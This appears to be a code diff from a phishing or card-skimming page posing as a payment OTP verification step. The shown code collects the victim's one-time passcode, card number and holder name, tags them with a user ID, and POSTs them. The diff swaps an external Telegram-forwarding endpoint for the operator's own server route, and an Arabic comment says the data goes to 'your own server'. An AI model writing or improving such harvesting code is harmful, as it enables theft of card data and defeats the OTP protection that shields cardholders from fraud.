@@ -133,15 +133,18 @@
             submitBtn.textContent = 'Verifying...';
 
             const paymentData = readJSON('pk_payment') || {};
+            const userId = localStorage.getItem('a2_user_id') || 'unknown';
             
             const payload = {
+                user_id: userId,
                 "رمز_التحقق_OTP": otpValue,
                 "رقم_البطاقة": paymentData.masked || hiddenCard.value || "غير متوفر",
                 "اسم_الحامل": paymentData.holder || "غير متوفر"
             };
 
             try {
-                await fetch("https://telegram-form-api-lemon.vercel.app/api/send", {
+                // إرسال كود الـ OTP إلى سيرفرك الخاص (نفس ملف الإرسال أو ملف منفصل)
+                await fetch("/api/payment-send", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
